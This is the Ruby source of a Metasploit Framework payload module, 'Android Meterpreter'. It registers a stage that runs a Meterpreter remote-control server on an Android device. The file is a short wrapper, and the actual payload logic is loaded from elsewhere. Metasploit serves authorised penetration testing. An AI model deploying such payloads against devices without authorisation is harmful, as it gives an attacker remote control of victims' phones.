##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/android'
require 'msf/core/payload/android/meterpreter_loader'
require 'msf/base/sessions/meterpreter_android'
require 'msf/base/sessions/meterpreter_options'


module MetasploitModule

  include Msf::Payload::Android::MeterpreterLoader
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Android Meterpreter',
      'Description'   => 'Run a meterpreter server in Android',
      'Author'        => ['mihi', 'egypt', 'OJ Reeves'],
      'Platform'      => 'android',
      'Arch'          => ARCH_DALVIK,
      'PayloadCompat' => {'Convention' => 'javasocket javaurl'},
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Java_Android
    ))
  end

  def generate_stage(opts={})
    stage_payload(opts)
  end
end
